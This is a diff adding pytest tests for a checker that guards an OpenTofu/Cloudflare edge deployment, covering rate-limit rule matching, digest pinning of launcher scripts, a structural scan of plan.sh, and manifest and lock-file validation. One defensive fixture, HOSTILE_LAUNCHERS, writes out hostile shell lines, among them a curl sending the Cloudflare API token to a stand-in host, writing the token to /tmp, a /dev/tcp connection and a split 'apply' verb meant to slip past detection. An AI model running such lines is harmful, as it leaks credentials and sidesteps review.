@@ -13,6 +13,7 @@ structural (docs/edge.md, "Structural controls").
 from __future__ import annotations
 
 import copy
+import hashlib
 import ipaddress
 import json
 import re
@@ -39,6 +40,8 @@ FILES = (
     "variables.tf",
     ".terraform.lock.hcl",
     "provider-fields.json",
+    "plan.sh",
+    "tofu.rc",
 )
 OVERRIDE_VARS = (
     "HTTPS_PROXY",
@@ -1415,6 +1418,201 @@ def test_two_rules_with_our_expression_and_no_ref_are_ambiguous() -> None:
     clone["ref"] = "renamed-2"
     live["rules"].append(clone)
     assert any("ambiguous" in x for x in check.rate_differences(d, live))
+
+
+def test_a_rule_matching_by_ref_plus_another_by_expression_is_ambiguous() -> None:
+    d = desired()["rate_limit"]
+    live = live_rules()
+    ours = [r for r in live["rules"] if r.get("ref") == d["ref"]][0]
+    other = copy.deepcopy(ours)
+    other["ref"] = "renamed"  # matches our expression, not our ref
+    live["rules"].append(other)
+    assert any("ambiguous" in x for x in check.rate_differences(d, live))
+    live["rules"].reverse()
+    assert any("ambiguous" in x for x in check.rate_differences(d, live))
+
+
+def test_a_rule_with_our_ref_and_another_with_our_expression_only_is_ambiguous() -> (
+    None
+):
+    d = desired()["rate_limit"]
+    live = live_rules()
+    ours = [r for r in live["rules"] if r.get("ref") == d["ref"]][0]
+    ours["expression"] = "true"  # matches by ref only
+    other = copy.deepcopy(ours)
+    other["ref"] = "someone-else"
+    other["expression"] = d["expression"]  # matches by expression only
+    live["rules"].append(other)
+    assert any("ambiguous" in x for x in check.rate_differences(d, live))
+
+
+def test_one_rule_matching_by_both_is_not_ambiguous() -> None:
+    d = desired()["rate_limit"]
+    assert not any("ambiguous" in x for x in check.rate_differences(d, live_rules()))
+
+
+# --- the token-bearing launcher is pinned and scanned (#613) -------------------
+
+
+def edit_file(root: Path, name: str, old: str, new: str) -> None:
+    path = root / EDGE / name
+    text = path.read_text()
+    assert old in text
+    path.write_text(text.replace(old, new, 1))
+
+
+def digest(root: Path, name: str) -> str:
+    return hashlib.sha256((root / EDGE / name).read_bytes()).hexdigest()
+
+
+def test_the_launchers_match_their_reviewed_digests() -> None:
+    assert set(check.LAUNCHER_PINS) == {"plan.sh", "tofu.rc"}
+    for name, want in check.LAUNCHER_PINS.items():
+        assert hashlib.sha256((REPO / EDGE / name).read_bytes()).hexdigest() == want
+
+
+@pytest.mark.parametrize("name", ["plan.sh", "tofu.rc"])
+def test_any_change_to_a_token_adjacent_file_needs_a_new_pin(
+    root: Path, name: str
+) -> None:
+    path = root / EDGE / name
+    path.write_text(path.read_text() + "\n# harmless comment\n")
+    assert any(
+        "reviewed digest" in p and name in p for p in check.offline_problems(root)
+    )
+
+
+def test_a_missing_launcher_fails(root: Path) -> None:
+    (root / EDGE / "plan.sh").unlink()
+    assert any("plan.sh" in p for p in check.offline_problems(root))
+
+
+HOSTILE_LAUNCHERS = {
+    "split verb": 'verb=ap\nverb+=ply\nexec /usr/bin/tofu "$verb"\n',
+    "exfiltrate": 'curl --data-binary "$CLOUDFLARE_API_TOKEN" https://x.invalid/\n',
+    "token to a file": 'echo "$CLOUDFLARE_API_TOKEN" > /tmp/t\n',
+    "eval": 'eval "$X"\n',
+    "dev tcp": "echo hi > /dev/tcp/203.0.113.1/80\n",
+    "other verb": "run_tofu apply\n",
+    "interpreter": "python3 -c pass\n",
+    "backtick": "x=`id`\n",
+    "indirect": 'y="${!name}"\n',
+}
+
+
+@pytest.mark.parametrize("name", sorted(HOSTILE_LAUNCHERS))
+def test_the_structural_scan_refuses_hostile_launcher_text_even_when_pinned(
+    root: Path, monkeypatch: pytest.MonkeyPatch, name: str
+) -> None:
+    path = root / EDGE / "plan.sh"
+    path.write_text(path.read_text() + HOSTILE_LAUNCHERS[name])
+    # someone also updated the pin: the scan alone must still refuse
+    monkeypatch.setattr(
+        check,
+        "LAUNCHER_PINS",
+        {**check.LAUNCHER_PINS, "plan.sh": digest(root, "plan.sh")},
+    )
+    problems = check.offline_problems(root)
+    assert any(p.startswith("plan.sh") for p in problems), problems
+
+
+def test_the_scan_accepts_the_reviewed_launcher() -> None:
+    assert check.plan_script_problems((REPO / EDGE / "plan.sh").read_text()) == []
+
+
+def test_an_added_token_line_that_was_not_reviewed_is_refused() -> None:
+    text = (REPO / EDGE / "plan.sh").read_text() + 'x="$CLOUDFLARE_API_TOKEN"\n'
+    assert any("token" in p for p in check.plan_script_problems(text))
+
+
+def test_run_tofu_may_only_init_and_plan() -> None:
+    text = (REPO / EDGE / "plan.sh").read_text()
+    assert check.plan_script_problems(
+        text.replace("run_tofu init", "run_tofu init2", 1)
+    )
+    assert check.plan_script_problems(text + "run_tofu plan\n")
+
+
+def test_codeowners_names_the_edge_files_and_the_checker() -> None:
+    owners = (REPO / ".github" / "CODEOWNERS").read_text()
+    for path in (
+        "/deploy/edge/",
+        "/scripts/check-edge.py",
+        "/tests/test_edge_settings.py",
+    ):
+        assert any(
+            line.startswith(path + " ") and "@ChiefGyk3D" in line
+            for line in owners.splitlines()
+        ), path
+
+
+# --- the reviewed minimum, the manifest identity and the lock shape (#613) -----
+
+
+@pytest.mark.parametrize(
+    "value",
+    [">= 0.1.0", ">= 1.8.0", ">= 1.9", ">= 1.9.0, < 3.0.0", "~> 1.9.0", ">= 1.10.0"],
+)
+def test_the_opentofu_minimum_cannot_be_changed_silently(
+    root: Path, value: str
+) -> None:
+    edit_file(root, "versions.tf", '">= 1.9.0"', f'"{value}"')
+    assert any("required_version" in p for p in check.offline_problems(root))
+
+
+@pytest.mark.parametrize(
+    ("key", "value"),
+    [
+        ("schema", 999),
+        ("schema", True),
+        ("provider", "attacker/example"),
+        ("resource", "unrelated_resource"),
+        ("command", "manually invented"),
+        ("computed_only", []),
+        ("computed_only", ["id"]),
+    ],
+)
+def test_the_manifest_identity_and_computed_fields_are_validated(
+    root: Path, key: str, value: object
+) -> None:
+    path = root / EDGE / "provider-fields.json"
+    data = json.loads(path.read_text())
+    data[key] = value
+    path.write_text(json.dumps(data))
+    assert any("manifest" in p and key in p for p in check.offline_problems(root))
+
+
+def test_an_extra_manifest_key_is_refused(root: Path) -> None:
+    path = root / EDGE / "provider-fields.json"
+    data = json.loads(path.read_text())
+    data["note"] = "x"
+    path.write_text(json.dumps(data))
+    assert any("unexpected keys" in p for p in check.offline_problems(root))
+
+
+LOCK_EDITS = {
+    "wrong source": (
+        "registry.opentofu.org/cloudflare/cloudflare",
+        "registry.example.invalid/x/y",
+    ),
+    "no constraints": ('  constraints = "5.29.0"\n', ""),
+    "constraints differ": ('constraints = "5.29.0"', 'constraints = ">= 5.0.0"'),
+    "version differs": ('version     = "5.29.0"', 'version     = "5.30.0"'),
+    "garbage hash": ('"h1:1fDzIJCxqkosa3+q7RJA3e4CBxFoCHHtQDz0ZkHGUWg="', '"nothash"'),
+}
+
+
+@pytest.mark.parametrize("name", sorted(LOCK_EDITS))
+def test_the_lock_entry_shape_is_validated(root: Path, name: str) -> None:
+    old, new = LOCK_EDITS[name]
+    edit_file(root, ".terraform.lock.hcl", old, new)
+    assert any("lock" in p for p in check.offline_problems(root))
+
+
+def test_a_second_lock_entry_is_refused(root: Path) -> None:
+    path = root / EDGE / ".terraform.lock.hcl"
+    path.write_text(path.read_text() + path.read_text().split("\n\n", 1)[1])
+    assert any("lock" in p for p in check.offline_problems(root))
 
 
 # --- the HCL checker reads tokens, never braces counted on raw lines (#613) ----
